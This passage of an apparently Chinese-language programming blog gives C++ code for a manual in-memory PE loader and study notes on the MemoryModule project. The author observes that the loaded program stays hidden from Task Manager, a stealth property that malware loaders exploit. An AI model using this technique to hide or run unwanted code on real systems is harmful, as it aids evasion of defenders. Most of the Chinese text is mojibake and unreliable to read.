printf(&quot;[-] Invalid PE file. &quot;); return -1; &#125; // Step 3: Check for relocation table bool hasRelocationTable = HasRelocationTable(lpFileBuffer); // Step 4: Allocate memory LPVOID lpImageBuffer = AllocateMemoryForPE(lpFileBuffer, hasRelocationTable); if (!lpImageBuffer) &#123; printf(&quot;[-] Memory allocation failed. &quot;); return -1; &#125; // Step 5: Copy PE file to allocated memory CopyPEToMemory(lpFileBuffer, lpImageBuffer); // Step 6: Fix relocations FixRelocations(lpImageBuffer); // Step 7: Repair IAT RepairIAT(lpImageBuffer); // Step 8: Update ImageBase UpdateImageBase(lpImageBuffer); // Step 9: Set memory permissions SetMemoryPermissions(lpImageBuffer); // Step 10: Jump to entry point JumpToEntryPoint(lpImageBuffer); return 0;&#125;LPVOID ReadPEFile(const char* filePath)&#123; printf(&quot;[+] Reading PE file: %s &quot;, filePath); // æ‰“å¼€æ–‡ä»¶ HANDLE hFile = CreateFileA( filePath, // æ–‡ä»¶è·¯å¾„ GENERIC_READ, // ä»¥åªè¯»æ–¹å¼æ‰“å¼€æ–‡ä»¶ FILE_SHARE_READ, // å…è®¸å…¶ä»–è¿›ç¨‹è¯»å–æ–‡ä»¶ NULL, // æ— å®‰å…¨å±æ€§ OPEN_EXISTING, // æ‰“å¼€ç°æœ‰æ–‡ä»¶ FILE_ATTRIBUTE_NORMAL,// æ–‡ä»¶ä¸ºæ™®é€šå±æ€§ NULL // æ— æ¨¡æ¿æ–‡ä»¶å¥æŸ„ ); if (hFile == INVALID_HANDLE_VALUE) &#123; printf(&quot;[-] CreateFile failed. &quot;); return NULL; &#125; // è·å–æ–‡ä»¶å¤§å° DWORD dwFileSize = GetFileSize(hFile, NULL); if (dwFileSize == INVALID_FILE_SIZE) &#123; printf(&quot;[-] GetFileSize failed. &quot;); CloseHandle(hFile); return NULL; &#125; // åˆ†é…å†…å­˜ç©ºé—´ LPVOID lpFileBuffer = VirtualAlloc( NULL, // è®©ç³»ç»Ÿå†³å®šåˆ†é…å†…å­˜çš„åœ°å€ dwFileSize, // åˆ†é…æ–‡ä»¶å¤§å°çš„å†…å­˜ç©ºé—´ MEM_RESERVE | MEM_COMMIT, // ä¿ç•™å¹¶æäº¤å†…å­˜ PAGE_READWRITE // è¯»å†™æƒé™ ); if (!lpFileBuffer) &#123; printf(&quot;[-] VirtualAlloc failed. &quot;); CloseHandle(hFile); return NULL; &#125; // è¯»å–æ–‡ä»¶å†…å®¹åˆ°å†…å­˜ DWORD dwBytesRead; if (!ReadFile( hFile, // æ–‡ä»¶å¥æŸ„ lpFileBuffer, // ç›®æ ‡ç¼“å†²åŒºåœ°å€ dwFileSize, // è¦è¯»å–çš„å­—èŠ‚æ•° &amp;dwBytesRead, // å®é™…è¯»å–çš„å­—èŠ‚æ•° NULL // ä¸ä½¿ç”¨é‡å I/O ) || dwBytesRead != dwFileSize) &#123; printf(&quot;[-] ReadFile failed. &quot;); VirtualFree(lpFileBuffer, 0, MEM_RELEASE); CloseHandle(hFile); return NULL; &#125; // å…³é—­æ–‡ä»¶å¥æŸ„ CloseHandle(hFile); printf(&quot;[*] PE file read successfully. &quot;); return lpFileBuffer;&#125;bool ValidatePEFile(LPVOID lpFileBuffer) &#123; PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)lpFileBuffer; if (dosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE) &#123; printf(&quot;[-] Invalid DOS signature. &quot;); return false; &#125; PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD)lpFileBuffer + dosHeader-&gt;e_lfanew); if (ntHeaders-&gt;Signature != IMAGE_NT_SIGNATURE) &#123; printf(&quot;[-] Invalid NT signature. &quot;); return false; &#125; return true;&#125;bool HasRelocationTable(LPVOID lpFileBuffer)&#123; printf(&quot;[+] Checking for relocation table... &quot;); auto ntHeaders = (PIMAGE_NT_HEADERS)((DWORD)lpFileBuffer + ((PIMAGE_DOS_HEADER)lpFileBuffer)-&gt;e_lfanew); bool hasReloc = ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0; printf(&quot;[*] Relocation table %s found. &quot;, hasReloc ? &quot;is&quot; : &quot;is not&quot;); return hasReloc;&#125;LPVOID AllocateMemoryForPE(LPVOID lpFileBuffer, bool hasRelocationTable)&#123; auto ntHeaders = (PIMAGE_NT_HEADERS)((DWORD)lpFileBuffer + ((PIMAGE_DOS_HEADER)lpFileBuffer)-&gt;e_lfanew); LPVOID lpImageBuffer = NULL; if (!hasRelocationTable) &#123; // æ²¡æœ‰é‡å®šä½è¡¨ï¼ŒæŒ‰ImageBaseç”³è¯·å†…å­˜ lpImageBuffer = VirtualAlloc( (LPVOID)ntHeaders-&gt;OptionalHeader.ImageBase, // æŒ‡å®šåŸºå€ ntHeaders-&gt;OptionalHeader.SizeOfImage, // æ˜ åƒå¤§å° MEM_COMMIT | MEM_RESERVE, // å†…å­˜åˆ†é…ç±»å‹ PAGE_READWRITE // å†…å­˜ä¿æŠ¤ç±»å‹ ); if (!lpImageBuffer) &#123; printf(&quot;Memory allocation at ImageBase failed. &quot;); return NULL; &#125; &#125; else &#123; // æœ‰é‡å®šä½è¡¨ï¼Œå…ˆå°è¯•æŒ‰ImageBaseç”³è¯·å†…å­˜ lpImageBuffer = VirtualAlloc( (LPVOID)ntHeaders-&gt;OptionalHeader.ImageBase, // æŒ‡å®šåŸºå€ ntHeaders-&gt;OptionalHeader.SizeOfImage, // æ˜ åƒå¤§å° MEM_COMMIT | MEM_RESERVE, // å†…å­˜åˆ†é…ç±»å‹ PAGE_READWRITE // å†…å­˜ä¿æŠ¤ç±»å‹ ); if (!lpImageBuffer) &#123; // å¦‚æœæŒ‰ImageBaseç”³è¯·å¤±è´¥ï¼Œå°è¯•ä»»æ„ä½ç½®ç”³è¯·å†…å­˜ lpImageBuffer = VirtualAlloc( NULL, // è®©ç³»ç»Ÿå†³å®šåˆ†é…å†…å­˜çš„åœ°å€ ntHeaders-&gt;OptionalHeader.SizeOfImage, // æ˜ åƒå¤§å° MEM_COMMIT | MEM_RESERVE, // å†…å­˜åˆ†é…ç±»å‹ PAGE_READWRITE // å†…å­˜ä¿æŠ¤ç±»å‹ ); if (!lpImageBuffer) &#123; printf(&quot;Memory allocation failed. &quot;); return NULL; &#125; &#125; &#125; return lpImageBuffer;&#125;void CopyPEToMemory(LPVOID lpFileBuffer, LPVOID lpImageBuffer)&#123; printf(&quot;[+] Copying PE headers and sections to allocated memory... &quot;); auto dosHeader = (PIMAGE_DOS_HEADER)lpFileBuffer; auto ntHeaders = (PIMAGE_NT_HEADERS)((DWORD)lpFileBuffer + dosHeader-&gt;e_lfanew); auto sectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)ntHeaders + sizeof(IMAGE_NT_HEADERS)); //SizeOfHeadersç›´æ¥å¯¹æ‹· memcpy(lpImageBuffer, lpFileBuffer, ntHeaders-&gt;OptionalHeader.SizeOfHeaders); //ä»èŠ‚.PointerToRawDataæ‹·èŠ‚.SizeOfRawDataåˆ° -&gt; èŠ‚.VirtualAddress for (int i = 0; i &lt; ntHeaders-&gt;FileHeader.NumberOfSections; i++) &#123; memcpy((LPVOID)((DWORD)lpImageBuffer + sectionHeader[i].VirtualAddress), (LPVOID)((DWORD)lpFileBuffer + sectionHeader[i].PointerToRawData), sectionHeader[i].SizeOfRawData); &#125; printf(&quot;[*] PE headers and sections copied successfully. &quot;);&#125;void FixRelocations(LPVOID lpImageBuffer)&#123; printf(&quot;[+] Fixing relocations... &quot;); auto ntHeaders = (PIMAGE_NT_HEADERS)((DWORD)lpImageBuffer + ((PIMAGE_DOS_HEADER)lpImageBuffer)-&gt;e_lfanew); DWORD dwDelta = (DWORD)lpImageBuffer - ntHeaders-&gt;OptionalHeader.ImageBase; if (dwDelta == 0) &#123; printf(&quot;[*] No relocations needed. &quot;); return; &#125; auto pReloc = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)lpImageBuffer + ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress); while (pReloc-&gt;VirtualAddress) &#123; auto pTypeOffset = (PWORD)((DWORD)pReloc + sizeof(IMAGE_BASE_RELOCATION)); //TypeOffsetæ•°ç»„çš„æŒ‡é’ˆ DWORD dwRelocCount = (pReloc-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD); //é¡¹æ•° for (int i = 0; i &lt; dwRelocCount; i++) &#123; DWORD wType = pTypeOffset[i] &gt;&gt; 12; //é«˜4ä½æ˜¯ç±»å‹ DWORD wOffset = pTypeOffset[i] &amp; 0x0FFF; //ä½12ä½æ˜¯åç§» if (wType == IMAGE_REL_BASED_HIGHLOW) //å¯¹äº HIGHLOW ç±»å‹æ˜¯æ•°æ®ï¼Œè¿›è¡Œä¿®æ­£ &#123; //ä¿®æ­£æ•°æ® auto addressToFix = (PDWORD)((DWORD)lpImageBuffer + pReloc-&gt;VirtualAddress + wOffset); *addressToFix += dwDelta; &#125; &#125; pReloc = (PIMAGE_BASE_RELOCATION)((DWORD)pReloc + pReloc-&gt;SizeOfBlock); &#125; printf(&quot;[*] Relocations fixed. &quot;);&#125;void RepairIAT(LPVOID lpImageBuffer)&#123; printf(&quot;[+] Repairing Import Address Table... &quot;); auto ntHeaders = (PIMAGE_NT_HEADERS)((DWORD)lpImageBuffer + ((PIMAGE_DOS_HEADER)lpImageBuffer)-&gt;e_lfanew); DWORD importTableRVA = ntHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress; if (!importTableRVA) &#123; printf(&quot;[*] No import table. &quot;); return; &#125; auto importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)lpImageBuffer + importTableRVA); while (importDescriptor-&gt;Name) &#123; const char* dllName = (const char*)((DWORD)lpImageBuffer + importDescriptor-&gt;Name); HMODULE hModule = GetModuleHandleA(dllName); //å¦‚æœè¿™ä¸ªdllå·²åŠ è½½è¿‡ if (hModule == NULL) &#123; hModule = LoadLibraryA(dllName); if (hModule == NULL) &#123; printf(&quot;[-] LoadLibrary failed for %s. &quot;, dllName); importDescriptor++; continue; &#125; &#125; auto thunkINT = (PDWORD)((DWORD)lpImageBuffer + importDescriptor-&gt;OriginalFirstThunk); auto thunkIAT = (PDWORD)((DWORD)lpImageBuffer + importDescriptor-&gt;FirstThunk); while (*thunkINT) &#123; if (IMAGE_SNAP_BY_ORDINAL(*thunkINT)) //æœ€é«˜ä½ä¸º1ï¼Œåºå·æ–¹å¼è¾“å…¥ &#123; *thunkIAT = (DWORD)GetProcAddress(hModule, LPCSTR(*thunkINT &amp; 0x7fff)); if (!*thunkIAT) &#123; printf(&quot;[-] GetProcAddress failed for 0x%08X in %s. &quot;, *thunkINT &amp; 0x7fff, dllName); &#125; &#125; else //æœ€é«˜ä½ä¸º0ï¼Œå‡½æ•°åæ–¹å¼è¾“å…¥ &#123; auto importByName = (PIMAGE_IMPORT_BY_NAME)((DWORD)lpImageBuffer + *thunkINT); *thunkIAT = (DWORD)GetProcAddress(hModule, importByName-&gt;Name); if (!*thunkIAT) &#123; printf(&quot;[-] GetProcAddress failed for %s in %s. &quot;, importByName-&gt;Name, dllName); &#125; &#125; thunkINT++; thunkIAT++; &#125; importDescriptor++; &#125; printf(&quot;[*] Import Address Table repaired. &quot;);&#125;void UpdateImageBase(LPVOID lpImageBuffer)&#123; printf(&quot;[+] Updating ImageBase in PE headers... &quot;); auto ntHeaders = (PIMAGE_NT_HEADERS)((DWORD)lpImageBuffer + ((PIMAGE_DOS_HEADER)lpImageBuffer)-&gt;e_lfanew); ntHeaders-&gt;OptionalHeader.ImageBase = (DWORD)lpImageBuffer; printf(&quot;[*] ImageBase updated. &quot;);&#125;void SetMemoryPermissions(LPVOID lpImageBuffer)&#123; printf(&quot;[+] Setting memory permissions... &quot;); auto ntHeaders = (PIMAGE_NT_HEADERS)((DWORD)lpImageBuffer + ((PIMAGE_DOS_HEADER)lpImageBuffer)-&gt;e_lfanew); auto sectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)ntHeaders + sizeof(IMAGE_NT_HEADERS)); for (int i = 0; i &lt; ntHeaders-&gt;FileHeader.NumberOfSections; i++) &#123; DWORD oldProtect; DWORD newProtect = 0; if (sectionHeader[i].Characteristics &amp; IMAGE_SCN_MEM_EXECUTE) //å¯æ‰§è¡Œ &#123; newProtect = (sectionHeader[i].Characteristics &amp; IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ; //è¿˜å¯å†™ï¼šPAGE_EXECUTE_READWRITE &#125; //ä¸å¯å†™ï¼šPAGE_EXECUTE_READå¯æ‰§è¡Œå¯è¯» else //ä¸å¯æ‰§è¡Œ &#123; newProtect = (sectionHeader[i].Characteristics &amp; IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY; &#125; VirtualProtect((LPVOID)((DWORD)lpImageBuffer + sectionHeader[i].VirtualAddress), sectionHeader[i].Misc.VirtualSize, newProtect, &amp;oldProtect); &#125; printf(&quot;[*] Memory permissions set. &quot;);&#125;void JumpToEntryPoint(LPVOID lpImageBuffer)&#123; auto ntHeaders = (PIMAGE_NT_HEADERS)((DWORD)lpImageBuffer + ((PIMAGE_DOS_HEADER)lpImageBuffer)-&gt;e_lfanew); DWORD entryPoint = ntHeaders-&gt;OptionalHeader.AddressOfEntryPoint; DWORD imageBase = (DWORD)lpImageBuffer; if (ntHeaders-&gt;FileHeader.Characteristics &amp; IMAGE_FILE_DLL) &#123; // å¦‚æœæ˜¯DLL using DllEntryProc = BOOL(WINAPI*)(HINSTANCE, DWORD, LPVOID); auto dllMain = (DllEntryProc)(imageBase + entryPoint); printf(&quot;[+] Calling DllMain at: 0x%08X &quot;, imageBase + entryPoint); dllMain((HINSTANCE)lpImageBuffer, DLL_PROCESS_ATTACH, NULL); printf(&quot;[*] DllMain called successfully. &quot;); &#125; else &#123; // å¦‚æœæ˜¯EXE using ExeEntryProc = int(WINAPI*)(); auto exeMain = (ExeEntryProc)(imageBase + entryPoint); printf(&quot;[+] Calling ExeMain at: 0x%08X &quot;, imageBase + entryPoint); exeMain(); printf(&quot;[*] ExeMain called successfully. &quot;); &#125;&#125; æ‰§è¡Œæ¼”ç¤º ç¤ºä¾‹exeç¤ºä¾‹dllå…¶ä»–exemainå‡½æ•°ä¸­çš„PEæ–‡ä»¶è·¯å¾„1const char* peFilePath = &quot;D:\\\\005_Codefield\\\\VS2019\\\\ManualPELoader\\\\Debug\\\\TestExe.exe&quot;; æ‰‹åŠ¨æ‹‰ä¼¸çš„exeåä¸ºTestExe.exeï¼Œåœ¨ä»»åŠ¡ç®¡ç†å™¨ä¸­åªèƒ½çœ‹åˆ°ManualPELoader.exeçš„è¿è¡Œï¼Œçœ‹ä¸åˆ°TestExe.exeã€‚TestExe.exeæ­¤æ—¶æ˜¯ManualPELoader.exeè¿›ç¨‹ä¸­çš„â€œæ•°æ®â€ ç¤ºä¾‹exeçš„ä»£ç 1234567#include&lt;Windows.h&gt;int main()&#123; MessageBoxA(NULL, &quot;This is a exe to be tested&quot;, &quot;123&quot;, MB_OK); return 0;&#125;mainå‡½æ•°ä¸­çš„PEæ–‡ä»¶è·¯å¾„1const char* peFilePath = &quot;D:\\\\005_Codefield\\\\VS2019\\\\ManualPELoader\\\\Debug\\\\TestDll.dll&quot;; ç¤ºä¾‹dllçš„ä»£ç 123456789101112131415161718192021222324252627#include &lt;Windows.h&gt;void Init()&#123; MessageBox(0, TEXT(&quot;Init&quot;), TEXT(&quot;Init&quot;), MB_OK);&#125;BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: Init(); break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125;æ‰¾äº†å…¶ä»–ä¸¤ä¸ªx86çš„exeæƒ³å†…å­˜åŠ è½½è¯•ä¸€ä¸‹ï¼Œä½†æ˜¯æœ‰é—®é¢˜ï¼Œè¿™é‡Œè®°å½•ä¸‹ 12//const char* peFilePath = &quot;E:\\\\_Reversing\\\\IDA Pro\\\\IDA_Pro_v7.5_Portable\\\\ida.exe&quot;;//const char* peFilePath = &quot;E:\\\\_Reversing\\\\snapshot_2024-03-19_14-17\\\\release\\\\x32\\\\x32dbg.exe&quot;; LoadLibraryAåŠ è½½dllçš„è·¯å¾„é—®é¢˜ åƒä¸Šé¢çš„TestExe.exeï¼Œå®ƒæ²¡æœ‰ç”¨åˆ°è‡ªå·±å½“å‰ç›®å½•çš„å…¶ä»–dllï¼Œå› æ­¤èƒ½æˆåŠŸè¿›è¡Œå†…å­˜åŠ è½½ã€‚ä½†æ˜¯åƒida.exeè¿™æ ·çš„ç¨‹åºï¼Œå®ƒåœ¨å®ƒè‡ªèº«ç›®å½•ä¸‹æœ‰éœ€è¦åŠ è½½çš„dllã€‚å¦‚æœæˆ‘ç›´æ¥åœ¨VSçš„ç¼–è¯‘æ–‡ä»¶å¤¹ä¸‹æ‰§è¡ŒManualPELoader.exeï¼Œè¯•å›¾å†…å­˜åŠ è½½ida.exeï¼Œåœ¨è¿›è¡ŒIATè¡¨ä¿®å¤é‚£ä¸€æ­¥ï¼Œç”¨LoadLibraryAåŠ è½½idaç¨‹åºä¸­å¯¼å…¥è¡¨æè¿°çš„dllæ—¶ï¼ŒLoadLibraryAçš„æŸ¥æ‰¾è·¯å¾„æ˜¯ManualPELoader.exeçš„è·¯å¾„ï¼Œç„¶åæ˜¯ç³»ç»Ÿè·¯å¾„ã€‚ LoadLibraryAå¯ä»¥ç»™ä¸ªç»å¯¹è·¯å¾„ï¼Œä½†å¦‚æœä¼ å‚ç»™çš„æ˜¯ç»å¯¹è·¯å¾„ï¼Œå®ƒå°±åªä¼šåœ¨ç»™çš„ç»å¯¹è·¯å¾„ä¸‹è¿›è¡ŒæŸ¥æ‰¾äº† 123456789101112131415C:\\ida.exe + å…¶ä»–dllD:\\ManualPELoader.exeåœ¨D:\\ä¸‹è¿è¡ŒManualPELoader.exeï¼Œida.exeåšIATè¡¨ä¿®å¤æ—¶ç”¨LoadLibraryAåŠ è½½idaå¯¼å…¥è¡¨ä¸­æè¿°çš„dllæ—¶å€™æŸ¥æ‰¾é¡ºåºæ˜¯ï¼š 1ã€D:\\ 2ã€ç³»ç»Ÿç›®å½•æ­£ç¡®çš„åº”è¯¥æ˜¯ï¼š 1ã€C:\\ï¼ˆida.exeæ‰€åœ¨ç›®å½•ï¼‰ 2ã€ç³»ç»Ÿç›®å½•è§£å†³åŠæ³•ï¼šå°†ManualPELoader.exeæ‹·åˆ°ä¸ida.exeåŒä¸€ç›®å½•ä¸‹æ‰§è¡Œè¿™æ ·çš„è¯ï¼Œåªèƒ½ç”¨è°ƒè¯•å™¨è°ƒè¯•æ‰§è¡Œï¼Œä¸èƒ½ç”¨VSè°ƒè¯•æ‰§è¡Œäº† å…¶ä»–é—®é¢˜ å†…å­˜åŠ è½½åŠ è½½mfcçš„dllä¼šæœ‰é—®é¢˜ï¼Œå› ä¸ºå†…å­˜åŠ è½½è¿˜æ˜¯æœ‰åˆ«äºç³»ç»ŸåŠ è½½ï¼Œå½“è·³åˆ°PEå…¥å£æ‰§è¡Œæ—¶ä¼šåšæ£€æŸ¥ï¼Œå¦‚æœæ²¡æœ‰è¿™ä¸ªä¸œè¥¿ï¼Œç¨‹åºä¼šæŠ›å¼‚å¸¸ è¿™é‡Œå…ˆåšè®°å½•ï¼Œåç»­é‡åˆ°å†å›æ¥è§£å†³ï¼Œå‚è€ƒèµ„æ–™ ä¿®å¤å†…å­˜åŠ è½½mfc dllçš„Bugï¼Œx64 å†…å­˜åŠ è½½å¸¦mfc çš„dllå¤±è´¥é—®é¢˜ å…³äºå†…å­˜åŠ è½½MFC DLLé—®é¢˜ç ”ç©¶ä¸è§£å†³ è¿™æ˜¯è¯¯æ‰“è¯¯æ’ï¼Œè¿˜æ˜¯èƒ½ä½œä¸ºä¸€ç§åå†…å­˜åŠ è½½çš„æŠ€æœ¯å‘¢ï¼Ÿ ä¸Šé¢æµ‹çš„exeç”¨MemoryModuleä¹Ÿè¯•äº†ï¼Œä¸€æ ·çš„æŠ¥é”™ï¼Œæ‰€ä»¥æ”¾å¿ƒäº†ï¼Œæˆ‘çš„ä»£ç æ²¡é—®é¢˜hhhh æœªæ¥å¯ä»¥ç»§ç»­ä¼˜åŒ–å®Œå–„çš„ x64çš„æ”¯æŒ é‡å®šä½è¡¨åˆ¤æ–­è¦æ”¹ä¸‹ï¼ŒPE32+æœ‰äº›å­—æ®µæœ‰å˜åŒ–ï¼Œè¿˜æœ‰å“ªäº›åœ°æ–¹ï¼ˆï¼Ÿï¼‰ å¯ä»¥å‚è€ƒc++ pe loader 64 and 32 crashes some programs æ›´ç»†è‡´åœ°å¤„ç†åŒºå—çš„èŠ‚å±æ€§ å¤„ç†å¯ä¸¢å¼ƒçš„åŒºå—IMAGE_SCN_MEM_DISCARDABLE 1å‚è€ƒMemoryModuleé¡¹ç›®static BOOL FinalizeSections(PMEMORYMODULE module) è®¾ç½®åŒºå—å†…å­˜é¡µå±æ€§æ—¶ï¼Œè€ƒè™‘ä¸ç»è¿‡ç¼“å­˜çš„åŒºå—IMAGE_SCN_MEM_NOT_CACHED 1å‚è€ƒMemoryModuleé¡¹ç›®static BOOL FinalizeSection(PMEMORYMODULE module, PSECTIONFINALIZEDATA sectionData)å‡½æ•° æ‰§è¡ŒTLSå›è°ƒå‡½æ•° è®¾ç½®å®ŒåŒºå—å†…å­˜é¡µå±æ€§åï¼Œæ‰§è¡ŒTLSå›è°ƒå‡½æ•°ï¼Œå› ä¸ºTLSå›è°ƒå‡½æ•°å…ˆäºmainå‡½æ•°æ‰§è¡Œ 1å‚è€ƒMemoryModuleé¡¹ç›®static BOOL ExecuteTLS(PMEMORYMODULE module)å‡½æ•° èµ„æºçš„é‡Šæ”¾ ä¸Šé¢çš„ä»£ç åº”è¯¥æ˜¯æœ‰éƒ¨åˆ†ç”³è¯·çš„èµ„æºæ²¡åšé‡Šæ”¾å¤„ç†ï¼Œä¸å¤Ÿç»†è‡´ã€‚å¦‚æœæœ‰éœ€è¦ï¼Œå¯ä»¥å°†ä»£ç å°è£…æˆC++çš„ç±»ï¼Œä»¥ä¾¿äºèµ„æºç®¡ç† æ²¡æœ‰å¸è½½MemoryModuleçš„åŠŸèƒ½ åŠ ä¸ªVirtualFreeï¼Œå¾ˆå¿«çš„ ä½†æ˜¯å¦‚ä½•æ ‡è®°è¿™å—å†…å­˜æ˜¯è‡ªå·±å†…å­˜åŠ è½½çš„å†…å­˜ï¼ŸMemoryModuleé¡¹ç›®å°±æ˜¯ç”¨äº†ä¸€ä¸ªHMEMORYMODULEç»“æ„ä½“æ¥æè¿°è¿™ä¸ªä¿¡æ¯ å†…å­˜åŠ è½½dllåï¼Œç†è®ºä¸Šè¦è¿”å›è¿™ä¸ªæ¨¡å—çš„åŸºå€ï¼Œå¹¶æä¾›ä¸€ä¸ªè‡ªå®ç°çš„GetProcAddressç”¨äºæŸ¥è¯¢å¯¼å‡ºå‡½æ•° ç”¨ç³»ç»Ÿçš„GetProcAddresså°±èƒ½æŸ¥ï¼ˆåº”è¯¥å¯ä»¥ï¼Œæ²¡è¯•ï¼‰ è‡ªå·±å®ç°çš„è¯ï¼Œå…¶å®å°±æ˜¯å¯¹æ‹‰ä¼¸æ¨¡å—å¯¼å‡ºè¡¨æŸ¥è¯¢çš„äº‹ã€‚ä¹‹å‰å†™è¿‡çš„ï¼Œå†™è¿‡åºå·æ–¹å¼æŸ¥è¯¢å’Œåå­—æ–¹å¼æŸ¥è¯¢ï¼Œå°†è¿™ä¸¤ä¸ªæŸ¥è¯¢åˆå¹¶ä¸ºä¸€ä¸ªå‡½æ•°å³å¯ MemoryModuleé¡¹ç›®å­¦ä¹ è®°å½• é¡¹ç›®é“¾æ¥MemoryModuleï¼Œé…å¥—è¯´æ˜Loading a DLL from memory MemoryModuleé¡¹ç›®ä»£ç æ•´ä½“å¯ä»¥åˆ†ä¸ºä¸¤éƒ¨åˆ†è¿›è¡Œå­¦ä¹  å°†PEæ–‡ä»¶æ‰‹å·¥æ‹‰ä¼¸åˆ°å†…å­˜ä¸­ï¼Œè¿”å›ä¸€ä¸ªHMEMORYMODULEä¾›åç»­ä½¿ç”¨ï¼ˆå¯ä»¥ç†è§£ä¸ºä¸€ä¸ªhandleå¥æŸ„ï¼‰ é€šè¿‡HMEMORYMODULEå¯¹â€œMemoryModuleâ€è¿›è¡Œåç»­ä½¿ç”¨ MemoryLoadLibraryå’ŒMemoryLoadLibraryEx MemoryModule.hæ–‡ä»¶å‰é¢å®šä¹‰äº†5ä¸ªå‡½æ•°æŒ‡é’ˆ MemoryModule.h12345typedef LPVOID(*CustomAllocFunc)(LPVOID, SIZE_T, DWORD, DWORD, void*); //VirtualAlloctypedef BOOL(*CustomFreeFunc)(LPVOID, SIZE_T, DWORD, void*); //VirtualFreetypedef HCUSTOMMODULE(*CustomLoadLibraryFunc)(LPCSTR, void*); //LoadLibraryAtypedef FARPROC(*CustomGetProcAddressFunc)(HCUSTOMMODULE, LPCSTR, void*); //GetProcAddresstypedef void (*CustomFreeLibraryFunc)(HCUSTOMMODULE, void*); //FreeLibrary å½“ä½¿ç”¨MemoryLoadLibraryè¿›è¡Œå†…å­˜åŠ è½½æ—¶ï¼Œå†…éƒ¨è°ƒç”¨MemoryLoadLibraryExï¼Œæ­¤æ—¶ä¸Šé¢5ä¸ªå‡½æ•°æŒ‡é’ˆæŒ‡å‘ç³»ç»Ÿçš„APIå‡½æ•°VirtualAllocã€VirtualFreeã€LoadLibraryAã€GetProcAddressã€FreeLibrary MemoryLoadLibraryå‡½æ•°å®ç°123456789101112131415161718192021222324252627282930313233343536373839HMEMORYMODULE MemoryLoadLibrary( const void* data, //PEæ–‡ä»¶æ•°æ®æŒ‡é’ˆ size_t size //PEæ–‡ä»¶æ•°æ®çš„å¤§å°ï¼Œsizeç”¨äºå‡½æ•°å†…éƒ¨åšå¤§å°æ£€éªŒç”¨)&#123; return MemoryLoadLibraryEx(data, size, MemoryDefaultAlloc, MemoryDefaultFree, MemoryDefaultLoadLibrary, MemoryDefaultGetProcAddress, MemoryDefaultFreeLibrary, NULL);&#125;LPVOID MemoryDefaultAlloc(LPVOID address, SIZE_T size, DWORD allocationType, DWORD protect, void* userdata)&#123; UNREFERENCED_PARAMETER(userdata); return VirtualAlloc(address, size, allocationType, protect);&#125;BOOL MemoryDefaultFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType, void* userdata)&#123; UNREFERENCED_PARAMETER(userdata); return VirtualFree(lpAddress, dwSize, dwFreeType);&#125;HCUSTOMMODULE MemoryDefaultLoadLibrary(LPCSTR filename, void* userdata)&#123; HMODULE result; UNREFERENCED_PARAMETER(userdata); result = LoadLibraryA(filename); if (result == NULL) &#123; return NULL; &#125; return (HCUSTOMMODULE)result;&#125;FARPROC MemoryDefaultGetProcAddress(HCUSTOMMODULE module, LPCSTR name, void* userdata)&#123; UNREFERENCED_PARAMETER(userdata); return (FARPROC)GetProcAddress((HMODULE)module, name);&#125;void MemoryDefaultFreeLibrary(HCUSTOMMODULE module, void* userdata)&#123; UNREFERENCED_PARAMETER(userdata); FreeLibrary((HMODULE)module);&#125; å¦‚æœç”¨MemoryLoadLibraryExæ¥åšå†…å­˜åŠ è½½ï¼Œè¦é¢å¤–ä¼ é€’6ä¸ªå‚æ•°ï¼Œå…¶ä¸­5ä¸ªæ˜¯è‡ªå®šä¹‰å®ç°çš„å‡½æ•°ã€‚åœ¨MemoryModuleé¡¹ç›®ä¸­ï¼Œæ²¡æœ‰æä¾›è‡ªå®šä¹‰å®ç°çš„ VirtualAllocã€VirtualFreeã€LoadLibraryAã€GetProcAddressã€FreeLibraryï¼Œç•™MemoryLoadLibraryExä¼°è®¡æ˜¯ä¸ºäº†æœªæ¥æ‰©å±•æ—¶ç”¨ã€‚ MemoryLoadLibraryExå‡½æ•°å£°æ˜1234567HMEMORYMODULE MemoryLoadLibraryEx(const void* data, size_t size, CustomAllocFunc allocMemory, CustomFreeFunc freeMemory, CustomLoadLibraryFunc loadLibrary, CustomGetProcAddressFunc getProcAddress, CustomFreeLibraryFunc freeLibrary, void* userdata); HMEMORYMODULEç»“æ„ä½“ ä¸ºäº†æè¿°MemoryModuleå†…å­˜æ¨¡å—æ›´å¤šçš„ä¿¡æ¯ï¼Œç”¨äº†ä¸€ä¸ªç»“æ„ä½“æ¥æè¿°å®ƒã€‚æ¯”å¦‚å®ƒçš„åŸºå€ï¼Œexeå…¥å£ï¼Œæ˜¯å¦æ˜¯dllç­‰ä¿¡æ¯ã€‚ä½¿ç”¨æ—¶å¯ä»¥æŠŠå®ƒç†è§£ä¸ºhandleæ¥ä½¿ç”¨ã€‚ä½†å› ä¸ºå®ƒæ˜¯ç”¨hMemoryModuleæ¥ä½¿ç”¨ï¼Œå¯¼è‡´MemoryModuleé¡¹ç›®è€¦åˆåº¦è¾ƒé«˜ï¼Œæƒ³æ”¹é€ çš„è¯æ‹†ä»£ç å°±æ¯”è¾ƒéº»çƒ¦ã€‚ 123456789101112131415161718192021typedef struct &#123; PIMAGE_NT_HEADERS headers; unsigned char* codeBase; HCUSTOMMODULE* modules; int numModules; BOOL initialized; BOOL isDLL; BOOL isRelocated; CustomAllocFunc alloc; CustomFreeFunc free; CustomLoadLibraryFunc loadLibrary; 